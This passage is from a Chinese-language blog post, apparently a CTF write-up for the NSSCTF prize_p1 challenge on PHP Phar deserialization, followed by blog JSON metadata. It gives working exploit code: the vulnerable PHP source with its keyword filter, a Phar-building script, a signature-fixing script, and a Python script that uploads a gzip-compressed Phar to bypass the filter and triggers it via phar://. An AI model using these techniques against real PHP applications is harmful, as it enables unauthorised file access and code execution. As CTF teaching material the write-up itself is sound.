class-name\">getflag</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token function\">getenv</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"FLAG\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">A</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$config</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">config</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'w'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/get|flag|post|php|filter|base64|rot13|read|data/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"我知道你想干吗，我的建议是不要那样做。\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"./tmp/a.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">config</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'r'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/get|flag|post|php|filter|base64|rot13|read|data/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"我知道你想干吗，我的建议是不要那样做。\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/get|flag|post|php|filter|base64|rot13|read|data/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"我知道你想干吗，我的建议是不要那样做。\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"那么就从这里开始起航吧\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>看到<code>file_put_contents</code>，<code>file_get_contents</code>以及魔术方法<code>__destruct</code>，想到这里可以利用Phar反序列化，我们写个文件然后用phar伪协议包含这个文件就可以触发魔术方法，接下来说一下几个需要绕过的点</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、过滤了部分关键词，可以看到flag等关键词被绕过\n<span class=\"token number\">2</span>、Phar文件含有很多不可见字符，怎么用file_put_contents函数来完整的上传\n<span class=\"token number\">3</span>、<span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span>的绕过，即绕过抛出异常<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>对于第一点，我们这里需要知道一个知识，就是当<code>Phar</code>文件进行gzip压缩后，是不影响其功能的，所以我们这里可以通过对文件进行<code>gzip</code>压缩来绕过，第二点，当我们使用Python脚本来上传文件时，就可以完整的上传文件，第三点，这算的上是一个老生常谈的问题了，反序列化写数组而后给另一个赋值为0从而绕过。</p>\n<p>思路有了，接下来开始解题，首先构造Phar文件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">getflag</span><span class=\"token punctuation\">&#123;</span>\n\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">getflag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$phar</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Phar</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"ph1.phar\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//后缀名必须为phar</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">startBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">setStub</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;?php __HALT_COMPILER(); ?>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//设置stub</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">setMetadata</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//将自定义的meta-data存入manifest</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">addFromString</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"test.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//添加要压缩的文件</span>\n<span class=\"token comment\">//签名自动计算</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">stopBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>运行php文件后得到phar文件，打开文件修改<code>i:1</code>为<code>i:0</code>，然后再用脚本得到正确签名</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">import gzip \nfrom hashlib import sha1\nfile <span class=\"token operator\">=</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"ph1.phar\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"rb\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> \ntext <span class=\"token operator\">=</span> file<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">28</span><span class=\"token punctuation\">]</span> <span class=\"token comment\">#读取开始到末尾除签名外内容 </span>\nlast <span class=\"token operator\">=</span> file<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token comment\">#读取最后8位的GBMB和签名flag </span>\nnew_file <span class=\"token operator\">=</span> text<span class=\"token operator\">+</span><span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">digest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> last <span class=\"token comment\">#生成新的文件内容，主要是此时sha1正确了。 </span>\n<span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"ph2.phar\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"wb\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span>new_file<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>此时就得到了正确的phar文件，接下来构造写入文件的exp</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">A</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$config</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'w'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">A</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>得到写入文件的payload为<code>O:1:&quot;A&quot;:1:&#123;s:6:&quot;config&quot;;s:1:&quot;w&quot;;&#125;</code>，<br>同理得到读取文件的payload为<code>O:1:&quot;A&quot;:1:&#123;s:6:&quot;config&quot;;s:1:&quot;r&quot;;&#125;</code><br>接下来有phar文件了，我们只需要对文件进行压缩来绕过关键词检测，再借用python脚本和写入文件的payload，就可以上传文件，同时再利用读取文件的payload就可以触发Phar反序列化，得到flag，最终脚本如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">import requests\nimport gzip\nimport re\n\nurl <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'http://1.14.71.254:28496/'</span>\n\nfile <span class=\"token operator\">=</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"ph2.phar\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"rb\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#打开文件</span>\nfile_out <span class=\"token operator\">=</span> gzip<span class=\"token operator\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"phar.zip\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"wb+\"</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#创建压缩文件对象</span>\nfile_out<span class=\"token operator\">.</span><span class=\"token function\">writelines</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">)</span>\nfile_out<span class=\"token operator\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nfile<span class=\"token operator\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nrequests<span class=\"token operator\">.</span><span class=\"token function\">post</span><span class=\"token punctuation\">(</span>\n    url<span class=\"token punctuation\">,</span>\n    params<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token number\">0</span><span class=\"token punctuation\">:</span> <span class=\"token string single-quoted-string\">'O:1:\"A\":1:&#123;s:6:\"config\";s:1:\"w\";&#125;'</span>\n\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n    data<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token number\">0</span><span class=\"token punctuation\">:</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'phar.zip'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'rb'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">)</span> <span class=\"token comment\"># 写入</span>\n\nres <span class=\"token operator\">=</span> requests<span class=\"token operator\">.</span><span class=\"token function\">post</span><span class=\"token punctuation\">(</span>\n    url<span class=\"token punctuation\">,</span>\n    params<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token number\">0</span><span class=\"token punctuation\">:</span> <span class=\"token string single-quoted-string\">'O:1:\"A\":1:&#123;s:6:\"config\";s:1:\"r\";&#125;'</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n    data<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token number\">0</span><span class=\"token punctuation\">:</span> <span class=\"token string single-quoted-string\">'phar://tmp/a.txt'</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">)</span> <span class=\"token comment\"># 触发</span>\nres<span class=\"token operator\">.</span>encoding<span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'utf-8'</span>\nflag <span class=\"token operator\">=</span> re<span class=\"token operator\">.</span><span class=\"token function\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'(NSSCTF\\&#123;.+?\\&#125;)'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">findall</span><span class=\"token punctuation\">(</span>res<span class=\"token operator\">.</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>但我这里没有得到flag，看一些师傅说，这里的<code>/tmp/a.txt</code>无法写入内容，所以就不放flag截图了，思路应该是没什么问题的。</p>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><p><a href=\"https://xz.aliyun.com/t/10961#toc-1\">https://xz.aliyun.com/t/10961#toc-1</a><br><a href=\"http://blog.m1kael.cn/index.php/archives/14/\">http://blog.m1kael.cn/index.php/archives/14/</a><br><a href=\"https://yangxikun.com/php/2013/08/24/php-garbage-collection-mechanism.html\">https://yangxikun.com/php/2013/08/24/php-garbage-collection-mechanism.html</a></p>\n","feature":true,"text":"声明文章首发于先知社区https://xz.aliyun.com/t/11843 前言上周战队知识分享时，H3018大师傅讲了PHP GC回收机制的利用，学会了如何去绕过抛出异常。H3018大师傅讲述的很清楚，大家有兴趣的可以去看一下哇，链接如下https://www.bilib...","link":"","photos":[],"count_time":{"symbolsCount":"15k","symbolsTime":"14 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"PHP","slug":"PHP","count":1,"path":"api/tags/PHP.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%A3%B0%E6%98%8E\"><span class=\"toc-text\">声明</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#GC\"><span class=\"toc-text\">GC</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BB%80%E4%B9%88%E6%98%AFGC\"><span class=\"toc-text\">什么是GC</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#PHP%E4%B8%AD%E7%9A%84GC\"><span class=\"toc-text\">PHP中的GC</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%BC%95%E7%94%A8%E8%AE%A1%E6%95%B0\"><span class=\"toc-text\">引用计数</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#GC%E5%9C%A8PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">GC在PHP 反序列化中的利用</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#demo\"><span class=\"toc-text\">demo</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Gc%E5%9C%A8Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">Gc在Phar反序列化中的利用</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#demo-1\"><span class=\"toc-text\">demo</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#CTF%E5%AE%9E%E6%88%98\"><span class=\"toc-text\">CTF实战</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BE%8B%E9%A2%981\"><span class=\"toc-text\">例题1</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CTFShow-%E5%8D%B7%E7%8E%8B%E6%9D%AF-easy-unserialize\"><span class=\"toc-text\">CTFShow[卷王杯]easy unserialize</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#NSSCTF-prize-p1\"><span class=\"toc-text\">[NSSCTF]prize_p1</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0\"><span class=\"toc-text\">参考文章</span></a></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"浅析JWT Attack","uid":"a302f7d4a9c4a8ebcf973c7c3ec757d6","slug":"浅析JWT Attack","date":"2022-11-27T06:58:30.000Z","updated":"2023-03-14T07:25:14.000Z","comments":true,"path":"api/articles/浅析JWT Attack.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141525110.png","text":"声明文章首发于合天安全实验室https://mp.weixin.qq.com/s/WvVgavjJMXSZQsVFtHEOhA 前言在2022祥云杯时遇到有关JWT的题，当时没有思路，对JWT进行学习后来对此进行简单总结，希望能对正在学习JWT的师傅们有所帮助。 JWTJWT，即...","link":"","photos":[],"count_time":{"symbolsCount":"23k","symbolsTime":"21 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"JWT","slug":"JWT","count":1,"path":"api/tags/JWT.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"JAVAWeb 浅学笔记","uid":"1652a4b85d6c1ce935f814a6281e8e8f","slug":"JAVAWeb学习小记","date":"2022-11-13T16:54:30.000Z","updated":"2023-03-14T07:29:12.000Z","comments":true,"path":"api/articles/JAVAWeb学习小记.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141529297.png","text":"准备工作有IDEA，有Tomcat（去网上找一下tomcat官方网站，下载9版本的即可，10版本的可能因为与IDEA版本不适而发生各种报错），有Maven，Idea虽然自带有Maven，但其功能还是有些受限，最好还是去官网下载一下Maven到本地而后导入到IDEA中 MavenM...","link":"","photos":[],"count_time":{"symbolsCount":"22k","symbolsTime":"20 mins."},"categories":[{"name":"JAVA","slug":"JAVA","count":10,"path":"api/categories/JAVA.json"}],"tags":[{"name":"语言学习","slug":"语言学习","count":3,"path":"api/tags/语言学习.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true}}